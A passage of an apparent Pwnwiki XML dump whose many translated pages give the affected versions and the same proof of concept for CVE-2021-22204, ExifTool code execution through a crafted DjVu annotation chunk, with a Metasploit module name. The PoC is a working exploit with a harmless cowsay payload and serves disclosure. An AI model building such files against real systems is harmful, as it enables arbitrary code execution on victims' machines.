   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>pe3srmv8hsvcjkmjk6oepu29ef201ec</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ht</title>
    <ns>0</ns>
    <id>2688</id>
    <revision>
      <id>3187</id>
      <timestamp>2021-05-23T02:44:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Vèsyon ki afekte =="</comment>
      <origin>3187</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="g3napqxyk8fiv88yotgoe5gwz2oxy5p" xml:space="preserve">&lt;languages /&gt;

== Vèsyon ki afekte ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>g3napqxyk8fiv88yotgoe5gwz2oxy5p</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/hu</title>
    <ns>0</ns>
    <id>2713</id>
    <revision>
      <id>3212</id>
      <timestamp>2021-05-23T02:59:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool tetszőleges kódfuttatási biztonsági rés"</comment>
      <origin>3212</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="4ybzi0kr6x4woyln9xobf0919gmsdwk" xml:space="preserve">&lt;languages /&gt;

== Érintett verzió ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>4ybzi0kr6x4woyln9xobf0919gmsdwk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/hy</title>
    <ns>0</ns>
    <id>2731</id>
    <revision>
      <id>3230</id>
      <timestamp>2021-05-23T04:44:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool կոդերի կամայական կատարման խոցելիություն"</comment>
      <origin>3230</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="599" sha1="iazg5cs9y7v557ky6z1xkjiv4a8rbin" xml:space="preserve">&lt;languages /&gt;

== Տուժած տարբերակ ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>iazg5cs9y7v557ky6z1xkjiv4a8rbin</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/id</title>
    <ns>0</ns>
    <id>2742</id>
    <revision>
      <id>3241</id>
      <timestamp>2021-05-23T07:11:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool kerentanan eksekusi kode arbitrer"</comment>
      <origin>3241</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="592" sha1="gv61dpctsjquwiu1swnxqohf1hdom0u" xml:space="preserve">&lt;languages /&gt;

== Versi yang terpengaruh ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>gv61dpctsjquwiu1swnxqohf1hdom0u</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/is</title>
    <ns>0</ns>
    <id>2646</id>
    <revision>
      <id>3145</id>
      <timestamp>2021-05-23T02:32:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Áhrif útgáfa =="</comment>
      <origin>3145</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="585" sha1="s58742v45rl08yd90scckb2ey35pfhl" xml:space="preserve">&lt;languages /&gt;

== Áhrif útgáfa ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>s58742v45rl08yd90scckb2ey35pfhl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/it</title>
    <ns>0</ns>
    <id>2720</id>
    <revision>
      <id>3219</id>
      <timestamp>2021-05-23T03:11:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versione interessata =="</comment>
      <origin>3219</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="590" sha1="d5cb7d51th3ez3c0g5t7rvt280wlfq5" xml:space="preserve">&lt;languages /&gt;

== Versione interessata ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>d5cb7d51th3ez3c0g5t7rvt280wlfq5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ja</title>
    <ns>0</ns>
    <id>2728</id>
    <revision>
      <id>3227</id>
      <timestamp>2021-05-23T04:10:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool の任意のコード実行の脆弱性"</comment>
      <origin>3227</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="601" sha1="87ajc7nwxs4stffxl0joi14gtge0d1b" xml:space="preserve">&lt;languages /&gt;

==影響を受けるバージョン==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>87ajc7nwxs4stffxl0joi14gtge0d1b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ka</title>
    <ns>0</ns>
    <id>2612</id>
    <revision>
      <id>3111</id>
      <timestamp>2021-05-23T02:21:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool კოდის თვითნებური შესრულების მოწყვლადობა"</comment>
      <origin>3111</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="625" sha1="81smzuk4xewu9pe4j9amg51ilj62egk" xml:space="preserve">&lt;languages /&gt;

== დაზარალებული ვერსია ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>81smzuk4xewu9pe4j9amg51ilj62egk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/kk</title>
    <ns>0</ns>
    <id>2738</id>
    <revision>
      <id>3237</id>
      <timestamp>2021-05-23T05:25:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Зардап шеккен нұсқа =="</comment>
      <origin>3237</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="606" sha1="cp4sd314xjdylt6dii72b7cutlobr7j" xml:space="preserve">&lt;languages /&gt;

== Зардап шеккен нұсқа ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>cp4sd314xjdylt6dii72b7cutlobr7j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/km</title>
    <ns>0</ns>
    <id>2680</id>
    <revision>
      <id>3179</id>
      <timestamp>2021-05-23T02:42:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ភាពងាយរងគ្រោះនៃការប្រតិបត្តិកូដតាមអ៊ិនធរណេត"</comment>
      <origin>3179</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="624" sha1="b9yg30eghuauoneudajafahsqdgrr3y" xml:space="preserve">&lt;languages /&gt;

== កំណែដែលរងផលប៉ះពាល់ ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>b9yg30eghuauoneudajafahsqdgrr3y</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/kn</title>
    <ns>0</ns>
    <id>2730</id>
    <revision>
      <id>3229</id>
      <timestamp>2021-05-23T04:40:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== ಬಾಧಿತ ಆವೃತ್ತಿ =="</comment>
      <origin>3229</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="607" sha1="al1d09ab2trwgupyk0hou1wu2eacsf3" xml:space="preserve">&lt;languages /&gt;

== ಬಾಧಿತ ಆವೃತ್ತಿ ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>al1d09ab2trwgupyk0hou1wu2eacsf3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ko</title>
    <ns>0</ns>
    <id>2717</id>
    <revision>
      <id>3216</id>
      <timestamp>2021-05-23T03:02:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== 영향을받는 버전 =="</comment>
      <origin>3216</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="592" sha1="g4kqbpr9w1vvftvdv2mj3eeso16jipq" xml:space="preserve">&lt;languages /&gt;

== 영향을받는 버전 ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>g4kqbpr9w1vvftvdv2mj3eeso16jipq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ky</title>
    <ns>0</ns>
    <id>2647</id>
    <revision>
      <id>3146</id>
      <timestamp>2021-05-23T02:32:15Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool коддун өзүм билемдик менен аткарылышы"</comment>
      <origin>3146</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="607" sha1="mao4wuocjfzaqtvbc9ni7pwismaakd5" xml:space="preserve">&lt;languages /&gt;

== Таасирленген версия ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>mao4wuocjfzaqtvbc9ni7pwismaakd5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/lb</title>
    <ns>0</ns>
    <id>2665</id>
    <revision>
      <id>3164</id>
      <timestamp>2021-05-23T02:38:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool arbiträr Code Ausféierung Schwachstelle"</comment>
      <origin>3164</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="586" sha1="ni0gkkgg5i1z974zm7ush5ifl2c87o4" xml:space="preserve">&lt;languages /&gt;

== Betraff Versioun ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>ni0gkkgg5i1z974zm7ush5ifl2c87o4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/lt</title>
    <ns>0</ns>
    <id>2683</id>
    <revision>
      <id>3182</id>
      <timestamp>2021-05-23T02:43:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Paveikta versija =="</comment>
      <origin>3182</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="586" sha1="o3gnc9u98lpd9l92e7ev11409t7emye" xml:space="preserve">&lt;languages /&gt;

== Paveikta versija ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>o3gnc9u98lpd9l92e7ev11409t7emye</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/lv</title>
    <ns>0</ns>
    <id>2725</id>
    <revision>
      <id>3224</id>
      <timestamp>2021-05-23T04:04:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool patvaļīga koda izpildes ievainojamība"</comment>
      <origin>3224</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="589" sha1="8usovksftzj79tvc12gixoxv9hmsswe" xml:space="preserve">&lt;languages /&gt;

== Ietekmētā versija ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>8usovksftzj79tvc12gixoxv9hmsswe</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/mg</title>
    <ns>0</ns>
    <id>2711</id>
    <revision>
      <id>3210</id>
      <timestamp>2021-05-23T02:58:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool famonoana kaody tsy manara-dalàna"</comment>
      <origin>3210</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="591" sha1="1nc6x8ufkj5tx6cjsim3metr2uj9q30" xml:space="preserve">&lt;languages /&gt;

== kinova voakasik'izany ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>1nc6x8ufkj5tx6cjsim3metr2uj9q30</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/mn</title>
    <ns>0</ns>
    <id>2741</id>
    <revision>
      <id>3240</id>
      <timestamp>2021-05-23T06:51:30Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Нөлөөлөлд өртсөн хувилбар =="</comment>
      <origin>3240</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="618" sha1="5yoa3a19xyh82q1jnvi7mjssgxva1gd" xml:space="preserve">&lt;languages /&gt;

== Нөлөөлөлд өртсөн хувилбар ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>5yoa3a19xyh82q1jnvi7mjssgxva1gd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/ms</title>
    <ns>0</ns>
    <id>2743</id>
    <revision>
      <id>3242</id>
      <timestamp>2021-05-23T07:16:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versi terpengaruh =="</comment>
      <origin>3242</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="587" sha1="0o34teo2x9qzb8iqmzww19801cshbxo" xml:space="preserve">&lt;languages /&gt;

== Versi terpengaruh ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>0o34teo2x9qzb8iqmzww19801cshbxo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/my</title>
    <ns>0</ns>
    <id>2722</id>
    <revision>
      <id>3221</id>
      <timestamp>2021-05-23T03:42:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== ထိခိုက်ဗားရှင်း =="</comment>
      <origin>3221</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="615" sha1="i5cw8vm9qy9g2nakvw4bo28383mwrfh" xml:space="preserve">&lt;languages /&gt;

== ထိခိုက်ဗားရှင်း ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
&lt;/pre&gt;</text>
      <sha1>i5cw8vm9qy9g2nakvw4bo28383mwrfh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22204 ExifTool任意代碼執行漏洞/nl</title>
    <ns>0</ns>
    <id>2649</id>
    <revision>
      <id>3148</id>
      <timestamp>2021-05-23T02:33:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-22204 ExifTool-beveiligingslek met betrekking tot het uitvoeren van willekeurige code"</comment>
      <origin>3148</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="586" sha1="kprtc4vic8zx7zj56pxg8l15qyk5jij" xml:space="preserve">&lt;languages /&gt;

== Betrokken versie ==
ExifTool 7.44 to 12.23


==POC==
&lt;pre&gt;
  $ printf 'P1 1 1 0' &gt; moo.pbm
   $ cjb2 moo.pbm moo.djvu
   $ printf 'ANTa\0\0\0\40"(xmp(\\\n".qx(cowsay pwned&gt;&amp;2);#"' &gt;&gt; moo.djvu
   $ exiftool moo.djvu &gt; /dev/null
    _______
   &lt; pwned &gt;
    -------
           \   ^__^
            \  (oo)\_______
               (__)\       )\/\
                   ||----w |
                   ||     ||

-- 
Jakub Wilk
&lt;/pre&gt;

==Metasploit==
https://github.com/rapid7/metasploit-framework/pull/15185
&lt;pre&gt;
